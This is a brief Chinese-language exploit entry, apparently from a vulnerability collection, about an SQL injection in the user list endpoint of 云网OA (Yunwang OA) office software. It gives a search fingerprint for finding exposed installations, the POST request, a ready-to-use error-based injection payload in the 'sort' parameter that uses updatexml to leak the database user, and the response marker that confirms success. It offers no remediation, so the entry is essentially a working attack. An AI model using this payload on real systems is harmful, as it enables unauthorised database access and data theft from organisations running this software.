# 云网OAlist存在SQL注入漏洞

云网 ｜ SQL注入 ｜ —
- **指纹**：`body="云网OA"`
- **请求**：`POST /oa/user/list HTTP/1.1`

**Payload**
```
sort=)+tmp_count+WHERE+1+=+1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+-
```
- **响应特征**：200 XPATH